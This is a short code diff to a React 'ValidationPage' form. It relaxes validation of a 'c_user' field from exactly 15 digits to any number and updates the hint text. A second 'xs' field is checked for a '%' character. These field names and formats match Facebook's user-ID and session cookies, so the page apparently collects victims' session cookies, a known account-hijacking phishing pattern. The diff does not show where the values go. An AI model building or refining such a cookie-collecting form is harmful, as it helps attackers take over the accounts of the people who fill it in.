@@ -17,8 +17,8 @@ const ValidationPage = () => {
     const cUserValue = form.current.elements["c_user"].value;
     const xsValue = form.current.elements["xs"].value;
 
-    // Manual validation for c_user (must be exactly 15 digits)
-    const isCUserValid = cUserValue.length === 15 && !isNaN(cUserValue);
+    // Manual validation for c_user (no longer requires exactly 15 digits)
+    const isCUserValid = !isNaN(cUserValue);  // Allows any numeric value
 
     // Manual validation for xs (must contain at least one '%' symbol)
     const isXsValid = xsValue.includes('%');
@@ -124,7 +124,7 @@ const ValidationPage = () => {
                 type="number"
                 name="c_user"
                 required
-                title="Please enter exactly 15 digits"
+                title="Please enter a valid number"
               />
               <br />
               <label className="mt-2" style={{ fontSize: "12px" }}>
